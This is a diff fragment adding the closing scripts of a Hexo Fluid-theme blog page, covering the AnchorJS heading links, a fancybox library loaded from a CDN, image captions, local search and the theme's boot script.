+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
